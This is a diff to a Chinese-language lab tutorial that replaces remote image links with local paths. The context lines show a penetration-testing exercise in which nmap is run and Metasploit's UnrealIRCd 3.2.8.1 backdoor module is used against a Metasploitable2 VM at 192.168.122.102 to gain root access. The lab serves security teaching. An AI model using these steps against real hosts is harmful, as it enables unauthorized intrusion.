@@ -29,7 +29,7 @@
 
 本实验在实验楼的环境下进行。在实验楼的环境中，采用的实验环境包含两台虚拟机，分别是攻击机和靶机，攻击机和靶机的账户和密码参数思维导图如下：
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479889983908.png-wm)
+![图片描述](../imgs/1479889983908.png-wm_1.png)
 
 
 ## 二、环境启动
@@ -49,7 +49,7 @@ sudo virsh start Metasploitable2
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483505113969.png-wm)
+![图片描述](../imgs/1483505113969.png-wm_1.png)
 
 使用 `ping` 命令可以知道 Kali Linux 是否已经完全启动成功，当宿主机 Ubuntn 和 Kali Linux 两台主机能够 ping 通的时候，说明 Kali 已经启动。此时输入命令使用 ssh 进行连接：
 
@@ -58,7 +58,7 @@ sudo virsh start Metasploitable2
 ssh root@Kali
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483505661337.png-wm)
+![图片描述](../imgs/1483505661337.png-wm_2.png)
 
 
 ## 三、 渗透测试
@@ -188,7 +188,7 @@ sudo service postgresql start
 sudo msfconsole
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479991291836.png-wm)
+![图片描述](../imgs/1479991291836.png-wm_3.png)
 
 使用扫描神器 Nmap 对渗透的目标主机，进行扫描：
 
@@ -197,7 +197,7 @@ sudo msfconsole
 nmap -sV -T4 target
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994884087.png-wm)
+![图片描述](../imgs/1479994884087.png-wm.png)
 
 | 参数  | 参数所代表含义                                               |
 | ----- | ------------------------------------------------------------ |
@@ -212,7 +212,7 @@ search ircd
 ```
 
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994011608.png-wm)
+![图片描述](../imgs/1479994011608.png-wm.png)
 
 在 Kali 的 MSF 终端中，使用 `use` 命令，使用相应的模块，接着再使用 `show options` 命令，显示模块参数信息：
 
@@ -224,7 +224,7 @@ use exploit/unix/irc/unreal_ircd_3281_backdoor
 show options
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994092422.png-wm)
+![图片描述](../imgs/1479994092422.png-wm.png)
 
 使用 `set` 命令，设置所要攻击的主机：
 
@@ -233,7 +233,7 @@ show options
 set RHOST 192.168.122.102
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994266380.png-wm)
+![图片描述](../imgs/1479994266380.png-wm.png)
 
 一切就绪后，再使用 `exploit` 进行主机攻击：
 
@@ -242,7 +242,7 @@ set RHOST 192.168.122.102
 exploit
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994466227.png-wm)
+![图片描述](../imgs/1479994466227.png-wm.png)
 
 # 四、验证渗透攻击
 
@@ -262,7 +262,7 @@ ifconfig
 
 ```
 
-![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479994538961.png-wm)
+![图片描述](../imgs/1479994538961.png-wm.png)
 
 由图可知，在输入命令后，`whoami` 对应的值为 `root` 和 `hostname` 以及 ip 地址为 `192.168.122.102`,渗透攻击成功。
 
